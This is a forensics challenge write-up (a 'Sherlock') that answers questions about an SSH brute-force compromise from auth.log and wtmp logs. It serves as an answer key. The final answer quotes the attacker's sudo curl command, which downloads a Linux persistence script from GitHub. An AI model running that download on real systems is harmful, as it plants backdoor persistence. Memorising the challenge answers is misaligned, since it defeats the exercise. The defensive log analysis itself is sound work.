

##### Sherlock Scenario

In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.


Q1: Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?

A: 65.2.161.68

Opening the auth.log file we see a lot of entries about Invalid user from the same ip, i would assume that this ip is the attacker's.

![](../../Img/Pasted%20image%2020250425142803.png)

Q2: The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?

A: root

Looking further down we can find the username (searching for success didn't work, but accepted works)

![](../../Img/Pasted%20image%2020250425143038.png)

Q3: Identify the timestamp when the attacker logged in manually to the server to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.

A: 2024-03-06 06:32:45

In the wtmp file (after utmpdump bc u cant open the file just like that). We search for the root acc and the ip of the attacker and find the answer

![](../../Img/Pasted%20image%2020250425144054.png)

Q4: SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?

A: 37

This one is in the auth.log file, following the path of this questions, we can assume that it is asking for the manual login. (as oppose to the automated one, that being the first successful login of root with the attacker ip)

![](../../Img/Pasted%20image%2020250425144551.png)

Q5: The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?

A: cyberjunkie

In the same file, a little bit below we can see that a new user is created, and the modifications done to this user too.

![](../../Img/Pasted%20image%2020250425144753.png)

Q6: What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?

A: T1136.001

In the matrix (), we search first the persistence column, then for acc creation, and for the sub technique we select the appropiate (this been an acc created on the system itself it's a local acc)

Q7: What time did the attacker's first SSH session end according to auth.log?

A: 2024-03-06 06:37:24

Q8: The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?

A: /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
